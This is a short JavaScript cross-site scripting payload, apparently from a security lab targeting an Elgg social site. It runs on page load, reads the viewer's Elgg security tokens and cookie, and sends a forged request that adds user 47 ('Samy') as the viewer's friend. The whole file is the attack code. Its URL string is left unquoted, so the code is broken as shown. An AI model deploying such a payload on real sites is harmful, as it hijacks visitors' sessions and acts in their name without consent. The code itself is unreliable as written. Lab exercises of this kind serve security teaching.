window.onload = function (params) { 
	var Ajax=null; 
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
	var token="&__elgg_token="+elgg.security.token.__elgg_token; 
	//Construct the HTTP request to add Samy as a friend. 
	var sendurl=http://www.xsslabelgg.com/action/friends/add?friend=47+token+ts;
	//Create and send Ajax request to add friend 
	Ajax=new XMLHttpRequest(); 
	Ajax.open("GET", sendurl, true); 
	Ajax.setRequestHeader("Host","www.xsslabelgg.com"); 
	Ajax.setRequestHeader("Keep-Alive","300"); 
	Ajax.setRequestHeader("Connection","Keep-Alive"); 
	Ajax.setRequestHeader("Cookie", document.cookie); 
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); 
	Ajax.send(); 
} 